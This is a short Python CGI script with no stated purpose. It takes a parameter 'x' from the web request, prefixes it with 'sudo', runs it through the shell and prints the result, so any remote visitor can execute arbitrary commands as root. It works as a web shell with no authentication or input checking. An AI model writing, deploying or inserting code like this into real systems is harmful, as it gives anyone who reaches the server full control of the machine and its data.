#! /usr/bin/python
import cgi
import commands
print "content-type:text/html\r\n\r\n"

data=cgi.FieldStorage()
y=data.getvalue('x')
print "<pre>"
print commands.getoutput('sudo ' + y)
print "</pre>"
